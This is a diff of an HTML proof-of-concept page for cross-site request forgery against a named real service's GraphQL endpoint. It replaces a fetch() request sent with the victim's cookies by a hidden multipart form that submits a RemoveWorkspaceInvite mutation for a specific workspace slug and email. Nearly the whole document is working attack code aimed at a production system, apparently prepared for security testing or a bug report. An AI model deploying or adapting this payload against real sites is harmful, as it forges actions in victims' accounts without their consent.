@@ -2,44 +2,24 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CSRF PoC – RemoveWorkspaceInvite (Fetch)</title>
+  <title>CSRF PoC – RemoveWorkspaceInvite (multipart/form-data)</title>
 </head>
 <body>
-  <h2>CSRF PoC – Remove Workspace Invite (Fetch)</h2>
-  <button onclick="launchAttack()">Send CSRF via Fetch</button>
+  <h2>CSRF PoC – Remove Workspace Invite (multipart/form-data)</h2>
 
-  <script>
-    async function launchAttack() {
-      const url = "https://app.segment.com/gateway-api/graphql?operation=RemoveWorkspaceInvite";
+  <form action="https://app.segment.com/gateway-api/graphql?operation=RemoveWorkspaceInvite"
+        method="POST" enctype="multipart/form-data" target="_blank">
 
-      const bodyData = {
-        "operationName": "RemoveWorkspaceInvite",
-        "variables": {
-          "input": {
-            "workspaceSlug": "admin-test-1a07",
-            "email": "admin@segment.com"
-          }
-        },
-        "query": "mutation RemoveWorkspaceInvite($input: DeleteInviteInput!) {\n  deleteInvite(input: $input) {\n    deleted\n    __typename\n  }\n}\n"
-      };
+    <input type="hidden" name="operationName" value="RemoveWorkspaceInvite">
 
-      try {
-        const res = await fetch(url, {
-          method: "POST",
-          credentials: "include", // send cookies with request
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(bodyData)
-        });
+    <input type="hidden" name="variables"
+      value='{"input":{"workspaceSlug":"admin-test-1a07","email":"admin@segment.com"}}'>
 
-        console.log("Status:", res.status);
-        const text = await res.text();
-        console.log("Response:", text);
-        alert("Request sent. Check console for response.");
-      } catch (e) {
-        console.error("Fetch blocked:", e);
-        alert("Fetch blocked by CORS (likely safe).");
-      }
-    }
-  </script>
+    <input type="hidden" name="query"
+      value='mutation RemoveWorkspaceInvite($input: DeleteInviteInput!) { deleteInvite(input: $input) { deleted __typename } }'>
+
+    <button type="submit">Submit CSRF Request</button>
+  </form>
+
 </body>
 </html>
